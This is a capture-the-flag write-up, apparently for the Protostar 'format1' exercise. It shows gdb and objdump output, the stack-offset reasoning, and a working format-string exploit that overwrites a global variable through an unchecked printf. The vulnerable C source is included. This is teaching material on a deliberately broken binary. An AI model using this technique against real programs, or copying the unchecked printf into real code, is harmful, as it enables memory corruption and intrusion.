# Format 1

## Problem

```gdb
objdump -t format1 | grep target
>>>08049638 g     O .bss   00000004              target
```

As suggested by the hint, we find out what is the address of the target variable.
We also find out the dump of the vuln code. From the source code, we can also tell
that the program is expecting an argument that we can potentially try to do string
format attack on.

```gdb
Dump of assembler code for function vuln:
0x080483f4 <vuln+0>:    push   ebp
0x080483f5 <vuln+1>:    mov    ebp,esp
0x080483f7 <vuln+3>:    sub    esp,0x18
0x080483fa <vuln+6>:    mov    eax,DWORD PTR [ebp+0x8]
0x080483fd <vuln+9>:    mov    DWORD PTR [esp],eax
0x08048400 <vuln+12>:   call   0x8048320 <printf@plt>
0x08048405 <vuln+17>:   mov    eax,ds:0x8049638
0x0804840a <vuln+22>:   test   eax,eax
0x0804840c <vuln+24>:   je     0x804841a <vuln+38>
0x0804840e <vuln+26>:   mov    DWORD PTR [esp],0x8048500
0x08048415 <vuln+33>:   call   0x8048330 <puts@plt>
0x0804841a <vuln+38>:   leave
0x0804841b <vuln+39>:   ret
End of assembler dump.
```

## Idea and Attack process

We know the address we would like to modify. As long as we set the target variable
to some value other than 0, we will be able to print the message. We start by finding
the target address in the stack.

```
b*0x08048400
>>>Breakpoint 1 at 0x08048400
s
>>>Single stepping until exit from function vuln,
>>>which has no line number information.
>>>__printf (format=0xbffffe8a "aaaa") at printf.c:29
>>>29      printf.c: No such file or directory.
>>>        in printf.c

x/12wx $esp
>>>0xbffffc68:     0x00000001      0xb7eddf90      0xb7eddf99      0xb7fd7ff4
>>>0xbffffc78:     0xbffffc98      0x08048405      0x00000000      0x0804960c
>>>0xbffffc88:     0xbffffcb8      0x08048469      0xb7fd8304      0xb7fd7ff4
```

Thus, we can deduce that the location of the pointer is at `0xbffffc84`. The pointer
starts at `0xbffffe8a`, that is 518bytes away. This computes to 129 pointer shifts
before writing to our target location.

```gdb
./format1 $(python -c "print '\x38\x96\x04\x08' + '%x.'*129 + '%n'")
8804960c.bffffb48.8048469.b7fd8304.b7fd7ff4.bffffb48.8048435.bffffd18.b7ff1040.804845b.b7fd7ff4.8048450.0.bffffbc8.b7eadc76.2.bffffbf4.bffffc00.b7fe1848.bffffbb0.ffffffff.b7ffeff4.804824d.1.bffffbb0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffffbc8.52a9541a.78e7820a.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffffbf4.8048450.8048440.b7ff1040.bffffbec.b7fff8f8.2.bffffd0e.bffffd18.0.bffffea2.bffffead.bffffebd.bffffedf.bffffef2.bffffefc.bfffff10.bfffff52.bfffff69.bfffff7a.bfffff82.bfffff8d.bfffff9a.bfffffd0.bfffffe6.0.20.b7fe2414.21.b7fe2000.10.78bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.0.c.0.d.0.e.0.17.0.19.bffffceb.1f.bffffff2.f.bffffcfb.0.0.0.0.d2000000.fa1036db.f1b2d6af.5dbc36f0.696824ef.363836.0.0.0.2f2e0000.6d726f66.317461.you have modified the target :)
```

## Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```
